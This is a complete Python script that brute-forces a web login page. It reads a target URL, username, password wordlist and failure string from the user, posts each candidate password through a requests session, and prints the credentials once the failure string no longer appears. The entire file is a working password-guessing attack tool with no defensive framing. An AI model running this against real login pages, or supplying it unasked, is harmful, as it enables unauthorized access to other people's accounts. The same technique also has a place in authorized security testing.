import requests

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

def cracking(username, url):
    with open(password_file, 'r') as file:
        passwords = [password.strip() for password in file]

    with requests.Session() as session:
        for password in passwords:
            print(f'Trying: {password}')
            data = {'username': username, 'password': password, 'Login': 'submit'}
            print(data)
            
            response = session.post(url, data=data)
            print(response)
            if login_failed_string not in response.text:
                print(f'[+] Found Username: ==> {username}')
                print(f'[+] Found Password: ==> {password}')
                return

    print('[!!] Password Not In List')

cracking(username, url)
